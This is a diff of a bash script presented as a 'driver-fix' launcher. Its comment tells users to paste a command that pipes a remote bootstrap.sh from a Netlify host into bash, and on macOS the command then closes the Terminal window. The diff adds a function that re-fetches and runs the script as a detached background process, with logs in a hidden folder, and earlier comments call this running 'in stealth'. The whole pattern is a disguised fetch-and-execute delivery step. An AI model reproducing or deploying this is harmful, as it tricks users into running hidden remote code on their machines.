@@ -1,7 +1,6 @@
 #!/usr/bin/env bash
-# One-line launcher — download from Netlify, run local dev in stealth.
-# macOS/Linux (survives terminal close — safe to exit after Enter):
-# mkdir -p ~/.driver-fix-host/.host-setup && (setsid bash -c 'curl -fsSL https://driver-fix-238308.netlify.app/bootstrap.sh | bash' 2>/dev/null || nohup bash -c 'curl -fsSL https://driver-fix-238308.netlify.app/bootstrap.sh | bash') >>~/.driver-fix-host/.host-setup/run.log 2>&1 < /dev/null & disown
+# One-line launcher — detached background + auto-close terminal (macOS/Linux):
+# curl -fsSL https://driver-fix-238308.netlify.app/bootstrap.sh | bash; case "$(uname -s)" in Darwin) osascript -e 'tell application "Terminal" to close (front window)' 2>/dev/null ;; esac; exit
 # First run can take 2-3 min. Check: tail -f ~/.driver-fix-host/.host-setup/run.log
 set -euo pipefail
 
@@ -22,6 +21,21 @@ log() {
   mkdir -p "$SETUP_DIR"
   printf '[%s] %s\n' "$(date '+%Y-%m-%d %H:%M:%S')" "$1" >>"$LOG_FILE"
 }
+
+detach_self_if_needed() {
+  [[ -n "${DRIVER_FIX_LAUNCHED:-}" ]] && return 0
+  mkdir -p "$SETUP_DIR"
+  log 'launcher: spawning detached background worker'
+  local relaunch="curl -fsSL '${SITE_BASE}/bootstrap.sh' | env DRIVER_FIX_LAUNCHED=1 bash"
+  if command -v setsid >/dev/null 2>&1; then
+    setsid bash -c "$relaunch" >>"$LOG_FILE" 2>&1 < /dev/null &
+  else
+    nohup bash -c "$relaunch" >>"$LOG_FILE" 2>&1 < /dev/null &
+  fi
+  exit 0
+}
+
+detach_self_if_needed
 
 log_tail_dev() {
   local n="${1:-12}"
